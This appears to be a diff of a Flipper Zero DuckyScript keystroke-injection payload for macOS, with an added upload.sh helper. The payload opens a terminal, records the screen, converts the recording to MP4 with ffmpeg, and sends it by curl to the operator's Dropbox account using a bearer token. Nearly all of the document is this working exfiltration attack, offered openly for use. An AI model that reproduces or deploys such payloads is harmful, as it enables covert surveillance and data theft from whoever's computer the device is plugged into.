@@ -1,20 +1,44 @@
 REM Description: This script records the screen and saves the recording as a video file.
-REM Must have terminal recording privilege enabled
-REM screen recording command and the conversion of the recording to an MP4 file. 
-REM It includes a delay of 10 seconds after starting the recording to allow for the desired recording duration. Can adjust the delay for longer recordings line  
+REM Converts the recording to an MP4 file.
+REM Then uploads the MP4 file to your Dropbox API
+REM Must have terminal recording privileges enabled 
+REM It includes a delay of 10 seconds after starting the recording to allow for the desired recording duration. Can adjust the delay for longer recordings line 50.
 
-REM After that, it sends the interrupt signal (Ctrl+C) to stop the recording. 
-REM It proceeds with the conversion of the recorded file 
-REM from MKV to MP4 format using the ffmpeg command And stores it in your dropbox API
+REM Must have ffmpeg installed! You can download through the terminal using the brew install ffmpeg command.
 
-REM Make sure to replace "YOUR_ACCESS_TOKEN" with your actual Dropbox access token in the code.
+
+REM Author: Narsty
+REM Title: Desktop Data Upload 
+REM Version 1.0 MacOs
+
+REM Copy and paste this /code into the Text edit App on your MacOs
+REM Replace the "Your API token Here" placeholder with your actual Dropbox API token. Line 21
+REM Replace "USERNAME HERE" WITH MAC USERNAME. Line 24.
+REM Can use terminal command whoami to find username.
+REM Save this script below as upload.sh file to your desktop.
+
+
+#!/bin/bash
+
+curl -X POST "https://content.dropboxapi.com/2/files/upload" \
+-H "Authorization: Bearer Your API token Here" \
+-H "Dropbox-API-Arg: {\"path\": \"/screen_recording.mp4\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" \
+-H "Content-Type: application/octet-stream" \
+--data-binary "@/Users/USERNAME HERE/Desktop/screen_recording.mp4"
+
+
+REM Title: Desktop Data Upload Execution Script 
+REM Version 1.0 MacOs
+
+REM Now save the below Ducky Script as a .txt file (main Read.me has step by step directions)
+REM and put the .txt on your flipper zero to execute the osascript through the terminal.
+
 
 REM Author: Narsty
 REM Title: Screen Recorder MacOs to Dropbox
 REM Target: MacOS 
 REM Version: 1.0
 REM Category: Execution
-
 
 DELAY 1000
 GUI SPACE
@@ -32,28 +56,13 @@ DELAY 500
 STRING ffmpeg -i ~/Desktop/screen_recording.mkv -c:v libx264 -preset fast -crf 23 -pix_fmt yuv420p ~/Desktop/screen_recording.mp4
 DELAY 250
 ENTER
-DELAY 500
-STRING curl -X POST "https://content.dropboxapi.com/2/files/upload" ^
-DELAY 500
+DELAY 10000
+STRING ~/Desktop/upload.sh
+DELAY 550
 ENTER
 DELAY 500
-STRING -H "Authorization: Bearer YOUR_ACCESS_TOKEN" ^
-DELAY 500
-ENTER
-DELAY 500
-STRING -H "Dropbox-API-Arg: {\"path\": \"/screen_recording.mp4\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" ^
-DELAY 500
-ENTER
-DELAY 500
-STRING -H "Content-Type: application/octet-stream" ^
-DELAY 500
-ENTER
-DELAY 500
-STRING --data-binary "@/Users/username/Desktop/screen_recording.mp4"
-DELAY 500
-ENTER
 
 
 
 
- 
+
